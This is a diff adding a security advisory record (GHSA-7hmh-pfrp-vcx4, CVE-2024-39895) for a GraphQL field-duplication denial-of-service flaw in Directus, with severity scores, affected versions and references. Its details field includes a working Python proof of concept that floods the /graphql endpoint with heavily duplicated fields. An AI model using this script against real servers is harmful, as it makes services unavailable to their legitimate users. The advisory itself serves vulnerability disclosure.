@@ -1,0 +1,69 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-7hmh-pfrp-vcx4",
+  "modified": "2024-07-08T18:41:00Z",
+  "published": "2024-07-08T18:41:00Z",
+  "aliases": [
+    "CVE-2024-39895"
+  ],
+  "summary": "Directus GraphQL Field Duplication Denial of Service (DoS)",
+  "details": "### Summary\nA denial of service (DoS) attack by field duplication in GraphQL is a type of attack where an attacker exploits the flexibility of GraphQL to overwhelm a server by requesting the same field multiple times in a single query. This can cause the server to perform redundant computations and consume excessive resources, leading to a denial of service for legitimate users.\n\n### Details\nRequest to the endpoint /graphql are sent when visualizing graphs generated at a dashboard:\n![image](https://github.com/directus/directus/assets/114263468/185eb60f-9092-47d4-81f4-add1a53e99c8)\n\n![DoS5](https://github.com/directus/directus/assets/114263468/f43079f5-b9ab-4704-938f-dcb91453d464)\n\n\nBy modifying the data sent and duplicating many times the fields a DoS attack is possible. \n\n### PoC\nThe goal is to create a payload that generates a body like this, where the 'max' field is duplicated many times, each with the 'id' field duplicated many times inside it.\n`{'query': 'query { query_4f4722ea: test_table_aggregated { max {id id id id id id id id id id  } max {id id id id id id id id id id  } max {id id id id id id id id id id  } max {id id id id id id id id id id  } max {id id id id id id id id id id  } max {id id id id id id id id id id  } max {id id id id id id id id id id  } max {id id id id id id id id id id  } max {id id id id id id id id id id  } max {id id id id id id id id id id  }  } }'}`\n\nAlthough that payload seems harmless, a bigger one leaves the service unresponsive. \n\nThe following code might serve as a PoC written in Python3:\n```# Field Duplication DoS \n# GitHub @asantof\n\nimport requests\n\n## CHANGE THIS VALUES: url, auth_token, query_name, collection_name\nurl = 'http://0.0.0.0:8055/graphql'\nauth_token = '' \nquery_name = 'query_XXXXX' \ncollection_name = ''  \n\nheaders = {\n    'Content-Type': 'application/json',\n    'Authorization': f'Bearer {auth_token}',\n}\n\nid_payload = 'id ' * 200\nmax_payload = 'max {' + id_payload + ' } '\nfull_payload = max_payload * 200\n\ndata = {\n    'query': 'query { ' + query_name + ': ' + collection_name + '_aggregated { ' + full_payload + ' } }'\n}\n\nprint(data)\n\nresponse = requests.post(url, headers=headers, json=data)\n\nprint(response.json())\n```\n\n![DoS4](https://github.com/directus/directus/assets/114263468/965e50bc-24dc-405c-a0f1-c973bd4f378d)\n\n\nAfter running it the service will be unresponsive for a while:\n![DoS](https://github.com/directus/directus/assets/114263468/9865acc1-9b82-4d3d-8929-cf32500ce14d)\n\n\n### Impact\nThe vulnerability impacts the service's availability by causing it to become unresponsive for a few minutes. An attacker could continuously send this request to the server, rendering the service unavailable indefinitely.",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"
+    },
+    {
+      "type": "CVSS_V4",
+      "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "@directus/env"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.1.6"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/directus/directus/security/advisories/GHSA-7hmh-pfrp-vcx4"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-39895"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/directus/directus/commit/543b345695071c1de61a35004bd063fe59dba0c8"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/directus/directus"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-400"
+    ],
+    "severity": "MODERATE",
+    "github_reviewed": true,
+    "github_reviewed_at": "2024-07-08T18:41:00Z",
+    "nvd_published_at": "2024-07-08T17:15:11Z"
+  }
+}
